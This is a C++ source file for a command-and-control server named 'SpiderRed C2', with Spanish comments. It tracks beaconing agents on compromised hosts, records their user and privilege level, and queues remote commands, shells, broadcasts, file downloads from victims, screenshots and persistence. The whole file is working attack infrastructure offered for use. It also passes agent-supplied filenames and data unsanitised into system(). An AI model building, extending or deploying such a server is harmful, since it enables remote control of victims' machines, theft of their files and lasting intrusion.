#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <map>
#include <mutex>
#include <queue>
#include <ctime>
#include <iomanip>
#include <chrono>
#include <atomic>

#define MAX_CLIENTS 100
#define BUFFER_SIZE 8192
#define PORT 4444
#define HEARTBEAT_INTERVAL 30

class Agent {
public:
    int socket;
    std::string id;
    std::string os;
    std::string user;
    std::string hostname;
    std::string internal_ip;
    std::string external_ip;
    std::string arch;
    time_t last_seen;
    bool active;
    int privilege_level; // 0=user, 1=admin, 2=system
    
    Agent(int sock, std::string identifier, std::string ext_ip) 
        : socket(sock), id(identifier), external_ip(ext_ip), active(true), privilege_level(0) {
        last_seen = time(nullptr);
    }
    
    std::string get_info() const {
        std::stringstream ss;
        ss << "ID: " << id << "\n"
           << "Host: " << hostname << " (" << internal_ip << ")\n"
           << "User: " << user << " (" << (privilege_level == 2 ? "SYSTEM" : privilege_level == 1 ? "ADMIN" : "USER") << ")\n"
           << "OS: " << os << " [" << arch << "]\n"
           << "External IP: " << external_ip << "\n"
           << "Last Seen: " << std::put_time(std::localtime(&last_seen), "%Y-%m-%d %H:%M:%S") << "\n"
           << "Status: " << (active ? "ACTIVE" : "INACTIVE");
        return ss.str();
    }
};

class Task {
public:
    std::string id;
    std::string command;
    std::string status; // "PENDING", "EXECUTING", "COMPLETED", "FAILED"
    std::string result;
    time_t created;
    time_t completed;
    
    Task(std::string cmd, std::string agent_id) 
        : command(cmd), status("PENDING"), created(time(nullptr)) {
        id = agent_id + "_" + std::to_string(created);
    }
};

class SpiderRedC2 {
private:
    std::vector<Agent> agents;
    std::mutex agents_mutex;
    std::map<std::string, std::queue<Task>> task_queues;
    std::mutex queue_mutex;
    std::map<std::string, std::vector<Task>> task_history;
    std::atomic<bool> running;
    std::string server_version;
    
public:
    SpiderRedC2() : running(true), server_version("SpiderRed C2 v2.1") {
        // Crear directorios necesarios
        system("mkdir -p downloads/uploads/logs 2>/dev/null");
    }
    
    void start() {
        display_banner();
        start_server();
    }
    
private:
    void display_banner() {
        std::cout << R"(
    ╔═══════════════════════════════════════════╗
    ║    _____       _     _____         _____  ║
    ║   / ____|     | |   |  __ \       |  __ \ ║
    ║  | (___  _ __ | |_  | |__) |___  _| |  | |║
    ║   \___ \| '_ \| __| |  _  // _ \| | |  | |║
    ║   ____) | |_) | |_  | | \ \ (_) |_| |__| |║
    ║  |_____/| .__/ \__| |_|  \_\___/(_)_____/ ║
    ║         | |                               ║
    ║         |_|      Advanced C2 Framework    ║
    ╚═══════════════════════════════════════════╝
    )" << std::endl;
        
        std::cout << "[*] " << server_version << std::endl;
        std::cout << "[*] Starting SpiderRed C2 Server..." << std::endl;
        std::cout << "[*] Type 'help' for available commands\n" << std::endl;
    }
    
    std::string exec_command(const std::string& cmd) {
        char buffer[256];
        std::string result = "";
        FILE* pipe = popen(cmd.c_str(), "r");
        if (!pipe) return "ERROR";
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            result += buffer;
        }
        pclose(pipe);
        return result;
    }
    
    void start_server() {
        int server_socket = socket(AF_INET, SOCK_STREAM, 0);
        if (server_socket < 0) {
            std::cerr << "[-] Socket creation failed: " << strerror(errno) << std::endl;
            return;
        }
        
        int opt = 1;
        if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
            std::cerr << "[-] Setsockopt failed: " << strerror(errno) << std::endl;
            close(server_socket);
            return;
        }
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(PORT);
        
        if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "[-] Bind failed: " << strerror(errno) << std::endl;
            close(server_socket);
            return;
        }
        
        if (listen(server_socket, MAX_CLIENTS) < 0) {
            std::cerr << "[-] Listen failed: " << strerror(errno) << std::endl;
            close(server_socket);
            return;
        }
        
        std::cout << "[+] C2 Server listening on 0.0.0.0:" << PORT << std::endl;
        
        // Hilo para aceptar conexiones
        std::thread accept_thread(&SpiderRedC2::accept_connections, this, server_socket);
        // Hilo para monitorear heartbeats
        std::thread monitor_thread(&SpiderRedC2::monitor_agents, this);
        // Hilo para interfaz de comandos
        std::thread command_thread(&SpiderRedC2::command_interface, this);
        
        accept_thread.detach();
        monitor_thread.detach();
        command_thread.join();  // Mantener este hilo principal
        
        close(server_socket);
    }
    
    void accept_connections(int server_socket) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        while (running) {
            int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
            if (client_socket < 0) {
                if (running) {
                    std::cerr << "[-] Accept failed: " << strerror(errno) << std::endl;
                }
                continue;
            }
            
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
            int client_port = ntohs(client_addr.sin_port);
            
            std::cout << "[+] New connection from " << client_ip << ":" << client_port << std::endl;
            
            // Crear hilo para manejar el agente
            std::thread(&SpiderRedC2::handle_agent, this, client_socket, std::string(client_ip)).detach();
        }
    }
    
    void handle_agent(int client_socket, std::string external_ip) {
        char buffer[BUFFER_SIZE];
        std::string agent_id = "";
        std::string agent_ip = external_ip;
        
        while (running) {
            memset(buffer, 0, BUFFER_SIZE);
            int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (bytes_received <= 0) {
                std::lock_guard<std::mutex> lock(agents_mutex);
                auto it = std::find_if(agents.begin(), agents.end(), 
                    [client_socket](const Agent& a) { return a.socket == client_socket; });
                if (it != agents.end()) {
                    std::cout << "[-] Agent " << it->id << " (" << it->hostname << ") disconnected" << std::endl;
                    it->active = false;
                    close(client_socket);
                }
                break;
            }
            
            std::string message(buffer, bytes_received);
            
            // Procesar mensaje del beacon
            if (message.find("BEACON|") == 0) {
                process_beacon(client_socket, message, agent_ip);
                continue;
            }
            
            // Procesar resultados de tareas
            if (message.find("RESULT|") == 0) {
                process_result(message);
                continue;
            }
            
            // Procesar upload de archivos
            if (message.find("FILE|") == 0) {
                process_file_upload(message);
                continue;
            }
            
            // Heartbeat
            if (message == "HEARTBEAT") {
                update_heartbeat(client_socket);
                send_task_to_agent(client_socket);
                continue;
            }
            
            // Error report
            if (message.find("ERROR|") == 0) {
                std::string error_msg = message.substr(6);
                std::cout << "[-] Error from agent " << agent_id << ": " << error_msg << std::endl;
                continue;
            }
        }
    }
    
    void process_beacon(int socket, const std::string& message, const std::string& external_ip) {
        std::vector<std::string> parts;
        std::stringstream ss(message);
        std::string part;
        
        while (std::getline(ss, part, '|')) {
            parts.push_back(part);
        }
        
        if (parts.size() < 8) {
            std::cerr << "[-] Invalid beacon format" << std::endl;
            return;
        }
        
        std::string agent_id = parts[1];
        std::string os = parts[2];
        std::string user = parts[3];
        std::string hostname = parts[4];
        std::string internal_ip = parts[5];
        std::string arch = parts[6];
        int privilege = std::stoi(parts[7]);
        
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        // Verificar si el agente ya existe
        auto it = std::find_if(agents.begin(), agents.end(), 
            [&agent_id](const Agent& a) { return a.id == agent_id; });
        
        if (it != agents.end()) {
            // Actualizar agente existente
            it->socket = socket;
            it->os = os;
            it->user = user;
            it->hostname = hostname;
            it->internal_ip = internal_ip;
            it->arch = arch;
            it->privilege_level = privilege;
            it->last_seen = time(nullptr);
            it->active = true;
            it->external_ip = external_ip;
            
            std::cout << "[*] Agent reconnected: " << hostname << " (" << user << ")" << std::endl;
        } else {
            // Crear nuevo agente
            agents.emplace_back(socket, agent_id, external_ip);
            Agent& new_agent = agents.back();
            new_agent.os = os;
            new_agent.user = user;
            new_agent.hostname = hostname;
            new_agent.internal_ip = internal_ip;
            new_agent.arch = arch;
            new_agent.privilege_level = privilege;
            
            std::cout << "[+] New agent registered: " << hostname 
                      << " (" << user << "@" << internal_ip << ")" 
                      << " [" << os << " " << arch << "]" << std::endl;
        }
        
        std::string response = "REGISTERED|" + agent_id;
        send(socket, response.c_str(), response.length(), 0);
    }
    
    void process_result(const std::string& message) {
        size_t sep = message.find('|', 7);
        std::string task_id = message.substr(7, sep - 7);
        std::string result = message.substr(sep + 1);
        
        std::lock_guard<std::mutex> lock(queue_mutex);
        
        // Buscar y actualizar tarea en el historial
        for (auto& [agent_id, tasks] : task_history) {
            for (auto& task : tasks) {
                if (task.id == task_id) {
                    task.status = "COMPLETED";
                    task.result = result;
                    task.completed = time(nullptr);
                    
                    std::cout << "\n[+] Task completed: " << task_id << std::endl;
                    std::cout << "[Result]:\n" << result << "\nC2> " << std::flush;
                    return;
                }
            }
        }
    }
    
    void process_file_upload(const std::string& message) {
        size_t sep1 = message.find('|', 5);
        size_t sep2 = message.find('|', sep1 + 1);
        
        std::string agent_id = message.substr(5, sep1 - 5);
        std::string filename = message.substr(sep1 + 1, sep2 - sep1 - 1);
        std::string filedata = message.substr(sep2 + 1);
        
        std::string filepath = "downloads/" + filename;
        std::ofstream file(filepath, std::ios::binary);
        
        if (file) {
            // Decodificar base64
            std::string command = "echo \"" + filedata + "\" | base64 -d > " + filepath;
            system(command.c_str());
            
            std::cout << "\n[+] File downloaded from " << agent_id 
                      << ": " << filepath << "\nC2> " << std::flush;
        } else {
            std::cerr << "[-] Failed to save file: " << filepath << std::endl;
        }
    }
    
    void update_heartbeat(int socket) {
        std::lock_guard<std::mutex> lock(agents_mutex);
        auto it = std::find_if(agents.begin(), agents.end(), 
            [socket](const Agent& a) { return a.socket == socket; });
        
        if (it != agents.end()) {
            it->last_seen = time(nullptr);
        }
    }
    
    void send_task_to_agent(int socket) {
        std::lock_guard<std::mutex> lock(queue_mutex);
        
        // Buscar agente por socket
        std::string agent_id = "";
        {
            std::lock_guard<std::mutex> agent_lock(agents_mutex);
            auto it = std::find_if(agents.begin(), agents.end(), 
                [socket](const Agent& a) { return a.socket == socket; });
            if (it != agents.end()) {
                agent_id = it->id;
            }
        }
        
        if (agent_id.empty()) return;
        
        // Enviar siguiente tarea en cola
        if (!task_queues[agent_id].empty()) {
            Task task = task_queues[agent_id].front();
            task_queues[agent_id].pop();
            
            task.status = "EXECUTING";
            task_history[agent_id].push_back(task);
            
            std::string command = "TASK|" + task.command;
            send(socket, command.c_str(), command.length(), 0);
        } else {
            // No hay tareas pendientes
            std::string response = "NOTASK";
            send(socket, response.c_str(), response.length(), 0);
        }
    }
    
    void monitor_agents() {
        while (running) {
            std::this_thread::sleep_for(std::chrono::seconds(HEARTBEAT_INTERVAL));
            
            std::lock_guard<std::mutex> lock(agents_mutex);
            time_t now = time(nullptr);
            
            for (auto& agent : agents) {
                if (agent.active && (now - agent.last_seen) > HEARTBEAT_INTERVAL * 3) {
                    std::cout << "[-] Agent " << agent.id << " (" << agent.hostname 
                              << ") missed heartbeat - marking as inactive" << std::endl;
                    agent.active = false;
                }
            }
        }
    }
    
    void command_interface() {
        std::string command;
        
        while (running) {
            std::cout << "SpiderRed> ";
            std::getline(std::cin, command);
            
            if (command.empty()) continue;
            
            std::vector<std::string> args;
            std::stringstream ss(command);
            std::string arg;
            
            while (ss >> arg) {
                args.push_back(arg);
            }
            
            if (args[0] == "help") {
                show_help();
            } else if (args[0] == "agents") {
                list_agents();
            } else if (args[0] == "info") {
                if (args.size() > 1) {
                    agent_info(args[1]);
                } else {
                    std::cout << "Usage: info <agent_id>" << std::endl;
                }
            } else if (args[0] == "interact") {
                if (args.size() > 1) {
                    interact_agent(args[1]);
                } else {
                    std::cout << "Usage: interact <agent_id>" << std::endl;
                }
            } else if (args[0] == "shell") {
                if (args.size() > 1) {
                    shell_agent(args[1]);
                } else {
                    std::cout << "Usage: shell <agent_id>" << std::endl;
                }
            } else if (args[0] == "exec") {
                if (args.size() > 2) {
                    std::string agent_id = args[1];
                    std::string cmd = command.substr(args[0].length() + args[1].length() + 2);
                    execute_command(agent_id, cmd);
                } else {
                    std::cout << "Usage: exec <agent_id> <command>" << std::endl;
                }
            } else if (args[0] == "broadcast") {
                if (args.size() > 1) {
                    std::string cmd = command.substr(args[0].length() + 1);
                    broadcast_command(cmd);
                } else {
                    std::cout << "Usage: broadcast <command>" << std::endl;
                }
            } else if (args[0] == "upload") {
                if (args.size() > 3) {
                    upload_file(args[1], args[2], args[3]);
                } else {
                    std::cout << "Usage: upload <agent_id> <local_file> <remote_path>" << std::endl;
                }
            } else if (args[0] == "download") {
                if (args.size() > 2) {
                    download_file(args[1], args[2]);
                } else {
                    std::cout << "Usage: download <agent_id> <remote_file>" << std::endl;
                }
            } else if (args[0] == "screenshot") {
                if (args.size() > 1) {
                    take_screenshot(args[1]);
                } else {
                    std::cout << "Usage: screenshot <agent_id>" << std::endl;
                }
            } else if (args[0] == "persist") {
                if (args.size() > 1) {
                    establish_persistence(args[1]);
                } else {
                    std::cout << "Usage: persist <agent_id>" << std::endl;
                }
            } else if (args[0] == "tasks") {
                if (args.size() > 1) {
                    list_tasks(args[1]);
                } else {
                    std::cout << "Usage: tasks <agent_id>" << std::endl;
                }
            } else if (args[0] == "kill") {
                if (args.size() > 1) {
                    kill_agent(args[1]);
                } else {
                    std::cout << "Usage: kill <agent_id>" << std::endl;
                }
            } else if (args[0] == "clear") {
                system("clear");
            } else if (args[0] == "exit" || args[0] == "quit") {
                std::cout << "[*] Shutting down SpiderRed C2..." << std::endl;
                running = false;
                exit(0);
            } else {
                std::cout << "[-] Unknown command. Type 'help' for available commands." << std::endl;
            }
        }
    }
    
    void show_help() {
        std::cout << R"(
╔═══════════════════════════════════════════════════════════════╗
║                    SpiderRed C2 - Commands                    ║
╠═══════════════════════════════════════════════════════════════╣
║  agents              - List all connected agents              ║
║  info <id>           - Show detailed agent information        ║
║  interact <id>       - Interact with specific agent           ║
║  shell <id>          - Get interactive shell on agent         ║
║  exec <id> <cmd>     - Execute command on agent               ║
║  broadcast <cmd>     - Send command to all agents             ║
║  upload <id> <l> <r> - Upload local file to remote path       ║
║  download <id> <f>   - Download file from agent               ║
║  screenshot <id>     - Take screenshot on agent               ║
║  persist <id>        - Establish persistence on agent         ║
║  tasks <id>          - Show task history for agent            ║
║  kill <id>           - Terminate agent session                ║
║  clear               - Clear screen                           ║
║  exit/quit           - Exit C2 server                         ║
╚═══════════════════════════════════════════════════════════════╝
)" << std::endl;
    }
    
    void list_agents() {
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        if (agents.empty()) {
            std::cout << "[-] No agents connected" << std::endl;
            return;
        }
        
        std::cout << "\n╔══════════════════════════════════════════════════════════════╗" << std::endl;
        std::cout << "║                    Connected Agents (" << agents.size() << ")                   ║" << std::endl;
        std::cout << "╠══════╦════════════════════════════════════════════════════════╣" << std::endl;
        std::cout << "║  ID  ║ Hostname               User@IP                Status  ║" << std::endl;
        std::cout << "╠══════╬════════════════════════════════════════════════════════╣" << std::endl;
        
        for (size_t i = 0; i < agents.size(); i++) {
            const Agent& agent = agents[i];
            std::string status = agent.active ? "ACTIVE" : "INACTIVE";
            std::string display_id = agent.id.substr(0, 4) + "..";
            std::string display_host = agent.hostname.substr(0, 20);
            std::string display_user = agent.user + "@" + agent.internal_ip.substr(0, 15);
            
            printf("║ %-4s ║ %-20s %-23s %-7s ║\n", 
                   display_id.c_str(), 
                   display_host.c_str(),
                   display_user.c_str(),
                   status.c_str());
        }
        
        std::cout << "╚══════╩════════════════════════════════════════════════════════╝" << std::endl;
    }
    
    void agent_info(const std::string& agent_id) {
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        auto it = std::find_if(agents.begin(), agents.end(), 
            [&agent_id](const Agent& a) { return a.id == agent_id; });
        
        if (it == agents.end()) {
            std::cout << "[-] Agent not found: " << agent_id << std::endl;
            return;
        }
        
        std::cout << "\n" << it->get_info() << std::endl;
    }
    
    void interact_agent(const std::string& agent_id) {
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        auto it = std::find_if(agents.begin(), agents.end(), 
            [&agent_id](const Agent& a) { return a.id == agent_id; });
        
        if (it == agents.end()) {
            std::cout << "[-] Agent not found: " << agent_id << std::endl;
            return;
        }
        
        if (!it->active) {
            std::cout << "[-] Agent is inactive: " << agent_id << std::endl;
            return;
        }
        
        std::cout << "[*] Interacting with agent: " << it->hostname 
                  << " (" << it->user << ")" << std::endl;
        std::cout << "[*] Type 'back' to return to main menu\n" << std::endl;
        
        std::string cmd;
        while (true) {
            std::cout << "SpiderRed[" << it->hostname << "]> ";
            std::getline(std::cin, cmd);
            
            if (cmd == "back" || cmd == "exit") {
                break;
            }
            
            if (!cmd.empty()) {
                execute_command(agent_id, cmd);
            }
        }
    }
    
    void shell_agent(const std::string& agent_id) {
        std::cout << "[*] Starting interactive shell on agent " << agent_id << std::endl;
        execute_command(agent_id, "shell");
    }
    
    void execute_command(const std::string& agent_id, const std::string& command) {
        std::lock_guard<std::mutex> lock(queue_mutex);
        
        Task task(command, agent_id);
        task_queues[agent_id].push(task);
        
        std::cout << "[+] Task queued for agent " << agent_id << ": " << command << std::endl;
    }
    
    void broadcast_command(const std::string& command) {
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        for (const auto& agent : agents) {
            if (agent.active) {
                execute_command(agent.id, command);
            }
        }
        
        std::cout << "[+] Command broadcasted to " << agents.size() << " agents" << std::endl;
    }
    
    void upload_file(const std::string& agent_id, const std::string& local_file, 
                    const std::string& remote_path) {
        // Leer archivo local y convertirlo a base64
        std::ifstream file(local_file, std::ios::binary);
        if (!file) {
            std::cerr << "[-] Cannot open local file: " << local_file << std::endl;
            return;
        }
        
        std::stringstream buffer;
        buffer << file.rdbuf();
        std::string file_data = buffer.str();
        
        // Convertir a base64 (simplificado)
        std::string command = "upload " + remote_path + " " + file_data;
        execute_command(agent_id, command);
        
        std::cout << "[+] File upload queued: " << local_file << " -> " << remote_path << std::endl;
    }
    
    void download_file(const std::string& agent_id, const std::string& remote_file) {
        std::string command = "download " + remote_file;
        execute_command(agent_id, command);
        std::cout << "[+] Download queued: " << remote_file << std::endl;
    }
    
    void take_screenshot(const std::string& agent_id) {
        execute_command(agent_id, "screenshot");
        std::cout << "[+] Screenshot command sent to agent " << agent_id << std::endl;
    }
    
    void establish_persistence(const std::string& agent_id) {
        execute_command(agent_id, "persist");
        std::cout << "[+] Persistence command sent to agent " << agent_id << std::endl;
    }
    
    void list_tasks(const std::string& agent_id) {
        std::lock_guard<std::mutex> lock(queue_mutex);
        
        if (task_history.find(agent_id) == task_history.end()) {
            std::cout << "[-] No task history for agent " << agent_id << std::endl;
            return;
        }
        
        const auto& tasks = task_history[agent_id];
        std::cout << "\nTask History for Agent " << agent_id << ":\n";
        std::cout << "════════════════════════════════════════════════════\n";
        
        for (const auto& task : tasks) {
            std::cout << "ID: " << task.id << "\n";
            std::cout << "Command: " << task.command.substr(0, 50) 
                      << (task.command.length() > 50 ? "..." : "") << "\n";
            std::cout << "Status: " << task.status << "\n";
            std::cout << "Created: " << std::put_time(std::localtime(&task.created), "%H:%M:%S") << "\n";
            if (task.completed > 0) {
                std::cout << "Completed: " << std::put_time(std::localtime(&task.completed), "%H:%M:%S") << "\n";
            }
            std::cout << "────────────────────────────────────────────────\n";
        }
    }
    
    void kill_agent(const std::string& agent_id) {
        std::lock_guard<std::mutex> lock(agents_mutex);
        
        auto it = std::find_if(agents.begin(), agents.end(), 
            [&agent_id](const Agent& a) { return a.id == agent_id; });
        
        if (it == agents.end()) {
            std::cout << "[-] Agent not found: " << agent_id << std::endl;
            return;
        }
        
        // Enviar comando de terminación
        std::string command = "exit";
        send(it->socket, command.c_str(), command.length(), 0);
        
        std::cout << "[+] Termination signal sent to agent " << agent_id << std::endl;
        close(it->socket);
        agents.erase(it);
    }
};

int main() {
    SpiderRedC2 c2_server;
    c2_server.start();
    
    return 0;
}
